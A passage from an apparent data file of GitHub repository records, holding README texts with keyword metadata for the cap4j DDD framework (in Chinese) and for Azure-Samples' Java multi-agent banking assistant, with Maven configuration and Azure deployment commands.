",0,0,1,mit,0.0,"['practical', 'ai', 'example', 'using', 'spring', 'ai', 'included', 'example', 'document', 'summarization', 'analysis', 'sentiment', 'analysis', 'text', 'drafting', 'image', 'data', 'extraction', 'advanced', 'rag', 'technique', 'retrieval', 'question', 'rewriting', 'requirements', 'application', 'expects', 'following', 'two', 'api', 'key', 'environment', 'variable', 'openai', 'api', 'key', 'cohere', 'api', 'key', 'document', 'see', 'comment', 'information', 'running', 'example', 'run', 'ide', 'use', 'following', 'command', 'using', 'local', 'model', 'use', 'local', 'model', 'ollama', 'updating', 'dependency', 'file', 'defining', 'model', 'use', 'file']","['example', 'api', 'key', 'use', 'model']",3,0,0,"['practical', 'ai', 'example', 'use', 'spring', 'ai', 'include', 'example', 'requirement', 'run', 'example', 'use', 'local', 'model']",5,"['example', 'ai', 'use', 'practical', 'spring']",1,0.0,1.0,"[com.vaadin:vaadin-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,822,38.0,5.535087719298246,[],0
netcorepal/cap4j,main,"# cap4j

[![Maven Central Version](https://img.shields.io/maven-central/v/io.github.netcorepal/cap4j)](https://central.sonatype.com/artifact/io.github.netcorepal/cap4j)
[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/netcorepal/cap4j/blob/main/LICENSE)

本项目是 [CAP](https://github.com/dotnetcore/CAP) 项目的 Java 实现超集，基于
[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)、
Mediator中介者模式、
[Outbox发件箱](https://www.kamilgrzybek.com/blog/posts/the-outbox-pattern)模式、
[CQS命令查询分离](https://martinfowler.com/bliki/CommandQuerySeparation.html)模式
以及[UoW](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/june/the-unit-of-work-pattern-and-persistence-ignorance)模式
等理念，cap4j期望解决如何基于`领域模型` 方便地 `实现领域驱动设计`的问题。

如果对以上架构理念有充分了解，那么cap4j的使用将会非常顺手。另一方面，通过cap4j来构建你的服务，你将学会一种实现领域驱动设计的完整落地方法。

## 快速开始

### 脚手架搭建
为了方便框架应用与理解，cap4j配备了代码生成插件`cap4j-ddd-codegen`，基于该插件，我们可以非常方便地生成初始项目脚手架、实体映射代码和基于JPA的聚合仓储代码。

#### **第一步**：新建一个空的maven项目
> 定好maven坐标三要素：`groupId`、`artifactId`、`version`

#### **第二步**：修改pom.xml
> 在pom.xml中添加`cap4j-ddd-codegen-maven-plugin`插件。
```xml
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>

    <groupId>io.github.netcorepal</groupId>
    <artifactId>cap4j-ddd-mvc-example</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>jar</packaging>

    <name>cap4j-ddd-mvc-example</name>
    <dependencies>
        <dependency>
            <groupId>io.github.netcorepal</groupId>
            <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
            <version>1.0.0-alpha-2</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>io.github.netcorepal</groupId>
                <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
                <version>1.0.0-alpha-2</version>
                <configuration>
                    <basePackage>org.netcorepal.cap4j.ddd.example</basePackage>
                    <archTemplate>https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json</archTemplate>
                    <multiModule>false</multiModule>
                    <moduleNameSuffix4Adapter>-adapter</moduleNameSuffix4Adapter>
                    <moduleNameSuffix4Domain>-domain</moduleNameSuffix4Domain>
                    <moduleNameSuffix4Application>-application</moduleNameSuffix4Application>
                    <connectionString>
                        <![CDATA[jdbc:mysql://127.0.0.1:3306/test?serverTimezone=Asia%2FShanghai&useSSL=false&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull]]>
                    </connectionString>
                    <user>root</user>
                    <pwd>123456</pwd>
                    <schema>test</schema>
                    <table></table>
                    <ignoreTable>\_\_%</ignoreTable>
                    <ignoreFields>db_%</ignoreFields>
                    <idField>id</idField>
                    <versionField>version</versionField>
                    <deletedField>db_deleted</deletedField>
                    <readonlyFields>db_created_at,db_updated_at</readonlyFields>
                    <entityBaseClass></entityBaseClass>
                    <entityClassExtraImports>static org.netcorepal.cap4j.ddd.domain.event.DomainEventSupervisorSupport.events</entityClassExtraImports>
                    <entitySchemaOutputMode>ref</entitySchemaOutputMode>
                    <entitySchemaOutputPackage>domain._share.meta</entitySchemaOutputPackage>
                    <fetchType>EAGER</fetchType>
                    <idGenerator>org.netcorepal.cap4j.ddd.domain.distributed.SnowflakeIdentifierGenerator</idGenerator>
                    <enumValueField>code</enumValueField>
                    <enumNameField>name</enumNameField>
                    <enumUnmatchedThrowException>true</enumUnmatchedThrowException>
                    <datePackage4Java>java.time</datePackage4Java>
                    <typeRemapping></typeRemapping>
                    <generateDefault>false</generateDefault>
                    <generateDbType>true</generateDbType>
                    <generateSchema>true</generateSchema>
                    <generateParent>false</generateParent>
                    <aggregateRootAnnotation></aggregateRootAnnotation>
                    <aggregateRepositoryBaseClass></aggregateRepositoryBaseClass>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```
通常，`cap4j-ddd-codegen`插件只需要我们根据团队或项目的实际情况调整以下配置项即可使用。
> `<basePackage>`_项目基础包名，一般为com.yourcompany.project_`</basePackage>` 
> 
> `<connectionString>`_数据库链接_`</connectionString>`
> 
> `<user>`_数据库账号_`</user>`
> 
> `<pwd>`_数据库密码_`</pwd>`
> 
> `<schema>`_数据库名称_`</schema>` 


#### **第三步**：执行插件命令，生成项目脚手架
> 插件配置项`archTemplate`是`gen-arch`命令生成脚手架目录与项目基础代码的配置文件地址。开放自定义方便大家根据自己团队需求进行定制化。格式说明后续补充，不过格式很简单，按示例中的配置自己应该就能看懂并应用。有兴趣更详细了解的参考源码[GenArchMojo](cap4j-ddd-codegen-maven-plugin/src/main/java/org/netcorepal/cap4j/ddd/codegen/GenArchMojo.java)

```shell
mvn cap4j-ddd-codegen:gen-arch
```
如果没有意外，`cap4j-ddd-codegen`插件将根据配置文件[cap4j-ddd-codegen-template.json](https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json)完成项目结构初始化！

#### 项目结构介绍
基于基础包路径配置，
```xml
<basePackage>org.netcorepal.cap4j.ddd.example</basePackage> 
```
`cap4j-ddd-codegen`插件在maven项目源码目录`src/main/java/org/netcorepal/cap4j/ddd/example`下将会生成4个`package`。
> - `_share`       公共代码
> - `adapter`      适配层(Interface Adapter)
> - `application`  应用层(Application Business Rules)
> - `domain`       领域层(Enterpprise Business Rules)

以上代码分层完全遵循[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)对于代码分层组织的观点。
![整洁架构](https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg)

更详细分层结构介绍，移步[项目分层结构介绍](doc/00_项目分层结构介绍.md)。

### 编码最佳实践
1. [领域层编码指南](doc/01_领域层编码指南.md)
2. [应用层编码指南](doc/02_应用层编码指南.md)
3. [适配层编码指南](doc/03_适配层编码指南.md)

### have a nice trip!",2,13,5,mit,10.0,"['cap', 'java', 'uow', 'genarchmojo', 'interface', 'adapter', 'application', 'business', 'rules', 'enterpprise', 'business', 'rules', 'nice', 'trip']","['business', 'rules', 'cap', 'java', 'uow']",5,0,0,"['nice', 'trip']",9,"['nice', 'trip']",3,0.0,9.0,"[org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,7.0,1.0,6260,75.125,6.973377703826955,"['![Maven Central Version -> https://img.shields.io/maven-central/v/io.github.netcorepal/cap4j', '![GitHub license -> https://img.shields.io/badge/license-MIT-blue.svg', 'CAP -> https://github.com/dotnetcore/CAP', '整洁架构 -> https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html', 'Outbox发件箱 -> https://www.kamilgrzybek.com/blog/posts/the-outbox-pattern', 'CQS命令查询分离 -> https://martinfowler.com/bliki/CommandQuerySeparation.html', 'UoW -> https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/june/the-unit-of-work-pattern-and-persistence-ignorance', 'cap4j-ddd-codegen-template.json -> https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json', '整洁架构 -> https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html', '整洁架构 -> https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg']",10
Azure-Samples/agent-openai-java-banking-assistant,main,"---
page_type: sample
languages:
- azdeveloper
- java
- bicep
- typescript
- html
products:
- ai-services 
- azure
- azure-openai
- active-directory
- azure-cognitive-search
- azure-container-apps
- azure-sdks
- github
- document-intelligence
- azure-monitor
- azure-pipelines
urlFragment: agent-openai-java-banking-assistant
name: Multi Agents Banking Assistant with Java and Semantic Kernel
description: A Java sample app emulating a personal banking AI-powered assistant to inquire about account balances, review recent transactions, or initiate payments
---
<!-- YAML front-matter schema: https://review.learn.microsoft.com/en-us/help/contribute/samples/process/onboarding?branch=main#supported-metadata-fields-for-readmemd -->
<!-- prettier-ignore -->
<div align=""center"">

![](./docs/assets/robot-agents-small.png)

# Multi Agents Banking Assistant with Java and Semantic Kernel

[![Open project in GitHub Codespaces](https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Build Status](https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build)](https://github.com/azure-samples/agent-openai-java-banking-assistant/actions)
![Java version](https://img.shields.io/badge/Java->=17-3c873a?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)

<!-- [![Watch how to use this sample on YouTube](https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube)]() -->

:star: If you like this sample, star it on GitHub — it helps a lot!

[Overview](#overview) • [Architecture](#agents-concepts-and-architectures) • [Get started](#getting-started) •  [Resources](#resources) • [FAQ](#faq) • [Troubleshooting](#troubleshooting)

![](./docs/assets/ui.gif)
</div>

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |
    | ACCOUNTS_ACA_DEV_APP_NAME     | The container app name for the business account api                                        |
    | PAYMENTS_ACA_DEV_APP_NAME     | The container app name for the business payment api                                        |
    | TRANSACTIONS_ACA_DEV_APP_NAME | The container app name for the business payment api                                        |


### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

⚠️ To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.


## Resources

Here are some resources to learn more about multi-agent architectures and technologies used in this sample:

- [Generative AI For Beginners](https://github.com/microsoft/generative-ai-for-beginners)
- [Azure OpenAI Service](https://learn.microsoft.com/azure/ai-services/openai/overview)
- [Semantic Kernel for Java](https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/)
- [OpenAI's Bet on a Cognitive Architecture](https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/)
- [THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY](https://arxiv.org/pdf/2404.11584)
- [MicroAgents: Exploring Agentic Architecture with Microservices](https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/)
- [Chat + Enterprise data with Azure OpenAI and Azure AI Search](https://github.com/Azure-Samples/azure-search-openai-java)
- [SK Agents Overview and High Level Design (.net)](https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns)

You can also find [more Azure AI samples here](https://github.com/Azure-Samples/azureai-samples).

## FAQ

You can find answers to frequently asked questions in the [FAQ](./docs/faq.md).

## Troubleshooting

If you have any issue when running or deploying this sample, please check the [troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue](https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues) in this repository.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
